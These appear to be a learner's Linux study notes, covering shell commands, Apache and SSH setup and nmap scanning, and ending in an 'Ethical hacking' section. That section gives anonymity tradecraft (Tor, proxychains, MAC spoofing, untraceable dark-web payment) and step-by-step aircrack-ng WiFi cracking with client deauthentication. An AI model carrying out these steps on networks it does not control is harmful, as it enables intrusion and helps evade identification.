
shell(GUI shell)(LUI shell)(top layer to user interface) -->

debian is base of linux distrubution

watch image of linux distrution in wiki

ubuntu distrubutor canonical//has many fork and unity 

pakage manager slakware,opensus,rehat and debian four types base on package manager(there also others)


while installing choose somting else add swaparea and can also add other pation for booting choose /(root)
swap partition acts as ram(while partitioning)

unity-tweak-tool
//different linux distro has diffrent package managers like apt,rpm
//different distro are forked from linux debian is the first linux distro ubuntu is popular
//past theam in home folder by creating .themes folder
//past icon in home folder by creating .icons folder
man cmdname (to gethelp)

ctl+h to see hidden file in GUI mode

/usr/share/applications (has the all installed files shortcuts)

cd ~
cd ~/document
ls /root/documents
sudo su
nano :-text editor
ifconfig
SSH servername

app -v //to know version number
app -g //to install global



sudo dpkg -i ./file.deb(not repository installation)
sudo dpkg --configure -a(to see waiting instalation step 1)
sudo apt-get install -f(to see waiting instalation step 2)

apt-get install node.js(no sudo); [remove]
sudo !!(last command executes with sudo)
apt-cache search node*(can also run without *)
apt-cache policy node.js(to verifiy version and know installed or not)
sudo dpkg -i ./name.deb
sudo chown root:dilip file.txt
sudo chown username -r /mydir/myfile.txt(recursive changes owership of all recurcively)
chmod 756
chmod u+r,g+x,o+r filename
1-exe 2-read 4-write

touch to create mutiple files
rm ./*.cpp

rm mydir/*
rm mydir/*.txt
rm command

mv
cp

find -type f -name "hi.php"
find -type f -name "*.php"(same case(php))
find -type f -iname "*.php"(al casese)
find /etc -type f -iname "*.php"(al casese)
find -type f -perms 0665 (find with file permissions)
find . -size -1M
find . -maxdepth 1 -type f -iname "*.php"(searchs at the depth of one folder hracy(/etc/filesfound))
find . -maxdepth 1 -type f -iname "*.php" -size +50K

grep -i -n "var" filename1 filename2 ---etc

find -type f -iname "*.php" -size -50k -exec grep -i -n "texttosearch" {} + (use both find and grep) //{} + is end of -exec flag

find -type f -iname "*.php" -size -50k -exec grep -i -n "texttosearch" {} + > hi.txt (writes output to hi.txt)

find -type f -iname "*.php" -size -50k -exec grep -i -n "texttosearch" {} + | tee hi.txt (writes and displays output to hi.txt)

Top (taskmanger)
ps s(non real time taskmanager)
ps s | grep -i processname(filename)//(gives large data)
pgrep processname//(gives only process ids)


kill -9 processid1 processid2 etc(or process name)
SIGHUP			      1				Hangup
SIGKILL			      9				Kill Signal
SIGTERM			      15			Terminate
killall processname

sudo servive serivename start//old style of starting and stoping service
sudo servive serivename stop
sudo servive serivename restart
sudo systemctl start service //new style of starting and stoping service
sudo systemctl stop service

crontab -e
in crontab file we can shedule commands. the above commad opens the file them you will find a example to add command with
if you want every time to happen use "*" symbole

code blocks linux IDE for c,c++ and fortran
ct5 is IDE for c++ to design GUI apps 



php LAMP
sudo apt-get install apache2 php7.0 mysql-server libapache2-mod-php7.0
/var/www(can the owner chown -r /var/www)
cd /etc/apche2 vim envvars
export APACHE_RUN_USER=dilip
  "      "     "  GROUP=dilip
(start apache service)


hosts file
vim /etc/hosts(contians domain names and ip address while route first checks the hosts file for ip address the goes to extrnal DNS)
example:
127.0.0.1 localhost(when you type localhost you will go to 127.0.0.1 which is local server(ex:apache we should install))
127.0.0.1 www.google.com(if also we enter google.com that will go to 127.0.0.1 beacuse this us file to check as DNS)

virtual host(coming soon ..)
first enable:
sudo a2enmod proxy
sudo a2enmod proxy_html
sudo a2enmod proxy_http
then in /etc/apache2/site-avaliable create file with .conf extension that may be app name ex: app.conf
configure as below:(currently not working)
<VirtualHost *:80>
	ServerName app.localhost(comment:this is the url to call the below page)
	ProxyRequests off
	<Proxy *>
		Order deny,allow
		Allow for all
	</Proxy>
	<Location />
		ProxyPass http://localhost:58080/
		ProxyPassReverse http://localhost:58080/
	</Location>
</VirtualHost>
after configuration enable it sudo a2ensite app
		to disable it sudo a2dissite app
go to app or website folder
-------
setting up phpmyadmin:
sudo apt-get install phpmyadmin
then configure apache2.conf
sudo vim /etc/apache2/apache2.conf
add this line at the end of the file
include /etc/phpmyadmin/apache.conf

Setting namebase virtual host:
https://httpd.apache.org/docs/2.4/vhosts/
<VirtualHost *:80>
	ServerName sample.localhot
	DocumentRoot /var/www/html/sample
<VirtualHost>
servername is the URL to call add the user to hosts file /etc/hosts with default sever address
DocumentRoot is folder name where app is present
apachectl -s is cmd to debug

npm is package manager for javascript

#!/usr/bin/ defines which interpreter to run
ex: #!/usr/bin/bash //shell script runs using bash
  : #!/usr/bin/python //python script runs using python

//python on linux
pip is linux manager of python
apt-get install python-pip
apt-get install python3-pip(for python 3)

//add new user
sudo adduser username
sudo adduser username sudo (to add user to sudo group i.e make the user to perform sudo cmds by adding sudo at the begning of cmd)
sudo deluser username
sudo passwd username
sudo groupadd tt(create group)
sudo chown username filename (change user)
sudo chown perviousgroupname:newgroupname filename (change group)

//packet sniffer command line
tcpdump(if not avilable install)
sudo tcpdump
tcpdump -c 10(limit to packets)
tcpdump -c 5 -A (5 packets in ascii terms)
tcpdump -c 5 -i wl01 (limited to one interface // wlo1 is interface no)
tcp -xx -i wlo1 (hexa decimal output with XX you also get asscii terms output)
tcpdump -i wlo1 port 22 (specific interface and specific port)

//network statistics netstat
//network status of all connected service
netstat -nr // network status of -r routes(routing table) -n prints ipaddress instead of domian names
netstat -i //network status of interfaces
netstat -ta // status of sockets

hostname (to find host name)
sudo hostnamectl set-hostname nameofthehost (the update in host file)

traceroute www.google.com

nmap tool network map //Nmap ("Network Mapper") is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. used see open ports

nmap www.google.com 
nmap 192.127.0.1 -v (verbose gives detail information)
nmap 192.127.0.1,100 (can scan mutiple devices hear only two ipaddress)
nmap 192.127.0.1-100 (range between 1 to 100)
nmap iL ~/notepad.txt (the file contains list of ipaddress)
nmap -A www.google.com (to know more info line os no etc we can also do range with this flag and other flags or options)

SSH connection(secure shell)
shh nameofuser@domianorhostname (can aslo use ipaddress insyead of host name)
ex: dnasu@kent.edu
then password: 05061992INf(not working jus exmaple)

sftp
we dont use ftp because while packet sniffing we can set the packets tranfering
sftp encrypts the packets and tranfers them
connecting is same as SSH as above
sftp username@hostname
when we "ls" on sftp shows files of remote location
"lls" while show the local files
put filename (cmd to send files to server)
get filename (cmd to get files)

setting SSH service on server
install openssh-server
configure SSHconfig file in /etc/ssh
configfile name sshd_config
change the port number
change permitRootLogin from without-password to no
and add AllowUsers [usernames] (only these users can log in)
above three line are in video need congigure more if you have router in between add port forwading explore and know more


kali Linux
configure the source-list(google) to get all package
sudo apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y

Ethical hacking

always use Virtual box to run kali linux software used for hacking can effect you pc so please don't try on Personal or normal PC

stay anonymous

use gift cards to buy for any transtion on dark web and pay cash
1)tor
install tor and download tor browers to access dark web
darkweb is .onion domain can be accessed only using tor and tor browser
tor browswer will encrypt data between hops
sudo apt-get install tor -y
sudo apt-cache search tor (to search any package)
tor assigns new Ip for very 10sec

2)proxychains
vim /etc/proxychains.conf has diffrent config you read the descrption and understand
tho they have diffrent config we use dynamic_chain
aslo use proxy_dns to hide you self from DNS server they receive request from your IP so others can find you
add any number of proxy server at bottom of the file there is an example how to add ip address
Ex protcol IP 		port username password
   socks5  192.168.0.1  8080 dilip    1234
run any app using proxychains command to use it
example: proxychains firefox, proxychains nmap etc
note: check tor service is on before using proxychains and test your IP with third part website whether you are anonymous or not 
and close browser or other app before starting proxychains you are not anynonomous if you app is already running and then you use proxychains(carefull) 
ex sites: whatismyaddress.com, checkdnsleaks
if anything goes worng restart tor (service tor status/start/stop/restart cmd with diffrent options)

3)VPN
before setting up or using VPN configure dhclient.config to use opendns server
we can be identified by the DNS server server used by our local ISP DNS server. so use a different DNS server of other location
edit vim /etc/dhcp/dhclient.conf
go to line prepend DNS Name servers and add other ipaddress and restart network-manager service(cmd : service network-manager restart)
to find DNS resolver config use: cat /etc/resolv.conf
we should setup DNS before using VPN
Then edit broser config
type about:config in browser url (opens config file be carefull work config can break your browser and make it less secure and vularable)
make media.peerconnection.enable to false
then go to VPNbook and download and vpn bundle and open it
download then unzip (cmd openvpn <bundle name (usetcp)>) enter username and password
open dns leak test and verfiy your ip (do standard test *if you did not set DNS you will see your ip and dns* good example)

4)Macchanger(to change mac address)
macchanger -h has all option
we can aslo crontab -e(auto command runner see notes about in linux) job to change ever new boot

5)NMap


6)wifi attacking

for global hacking we can use virtual box. but for local like wifi cracking and hacking it not a good idea to use virtualmachine kali linux
because have less resource in VM and also we donot have access to wlan card(we can buy a usb werless network card and configure to VM but lite)
*not only kali other linux like fedora etc has wifi cracking tools even windows(not a good Idea to use)
we use our laptop wlan hardware and attack device
our network card will recevice wireless date and disgards(igrones) which is not related to it(it should be in monitor mode to capture all traffic(which is encryped))

aircark-ng and reaver(guesses the wps pins) are tools

aircrack will take password list form a file to crack password. use crunch

cranch is tool which will generate random passwords with give criterion
ex cmd: crunch 3 5 abcdefghid23 (length between 3 to 5 and uses those characher to generate passwords)
it hard to generate passwords and pass to aricrack we can pipe password from crunch to aircrack
ex: crunch 3 5 adadadd | aircrack -w .....(not complete can see in below section)

before starting
bssid (base stationid, stations are devices connected to base station)
this not connect over internet it's local
step 1) keep you wlan card in monitor mode 
cmds used: ifconfig(lists all interfaces)
	   ifconfig wlan0 down (brings wireless card down we can make configuration)
	   iwconfig wlan0 mode monitor(monitor mode there are aslo other modes)
	   ifconfig wlan0 up
step 2) keep process that causes problems
cmds used: airmon-ng check wlan0(checks process associated to wlan card list all process(kill in order if not killed))
	   kill <process_id>
step3) list all access points around you using aircrack tool(with air crack tool we can see all access points around you and who are connected to them but not with networkmanager)
cmds used: airodump-ng wlan0(list all accesspoints info around you)
step 4) make a 4 way handshack to capture more data(-30 is better signal then -90)(atlest one station should be connected to basestation to do this)
cmds used: airodump-ng -c <channel_number>(found in step 3) -w <name_file_to_wirte result> --bssid <MAC_id_of_accesspoint> <wlan0>(capture more tranferd trafic into file)(run separate terminal window)
	   (do research on below command if you have more stations connected you may use other denial of service(to be safe deauth some not all) method to deauth)
	   aireplay-ng -0 0 -a <mac_id_accesspoit> <wlan0>(this will send fake deauth signal to accesspoint and device will try to connect automatically, then happens a four way handshack, you can see this in other window off capturing)(run in separate terminal window)
step 5)Cracking or extracting info from data captured file 

         







